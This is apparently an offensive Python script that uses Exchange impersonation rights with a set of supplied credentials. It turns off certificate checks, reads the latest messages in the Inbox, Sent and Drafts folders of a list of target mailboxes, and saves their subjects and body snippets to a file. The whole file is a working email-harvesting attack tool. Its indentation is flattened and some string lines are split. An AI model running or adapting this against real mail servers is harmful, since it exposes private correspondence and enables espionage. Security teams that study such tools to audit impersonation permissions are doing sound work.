#!/usr/bin/env python3
import os
from exchangelib import Credentials, Account, Configuration, IMPERSONATION
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
import urllib3
urllib3.disable_warnings()
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
def extract_mailbox_items(user, password, exchange_server, target_mailboxes,
output_file="results.txt"):
print(f"[*] Checking mailbox access for: {target_mailboxes}")
creds = Credentials(username=user, password=password)
config = Configuration(server=exchange_server, credentials=creds)
results = []
try:
Account(
primary_smtp_address=user,
config=config,
autodiscover=False,
access_type=IMPERSONATION
)
print("[+] Connected to Exchange\n")
for target in target_mailboxes:
print(f"[*] Extracting items from: {target}")
try:
target_account = Account(
primary_smtp_address=target,
config=config,
autodiscover=False,
access_type=IMPERSONATION
)
folder_map = {
"Inbox": target_account.inbox,
"Sent": target_account.sent,
"Drafts": target_account.drafts
}
for name, folder in folder_map.items():
print(f" [+] Reading {name}...")
for item in
folder.all().order_by('-datetime_created')[:20]: # limit 20 per folder
body = (item.text_body or "").replace("\n", "
").strip()
snippet = body[:200] + ("..." if len(body) > 200
else "")
line = f"[{target} - {name}]
{item.subject}\n{snippet}\n"
results.append(line)
except Exception as e:
err = f"[!] ACCESS DENIED to {target}: {str(e)[:100]}\n"
results.append(err)
print(err.strip())
except Exception as e:
print(f"[-] Connection failed: {e}")
# Always write results to file
with open(output_file, "w", encoding="utf-8") as f:
if results:
f.write("\n".join(results))
else:
f.write("[!] No items extracted.\n")
print(f"\n[+] Extraction complete. Results saved to:
{os.path.abspath(output_file)}")
return results
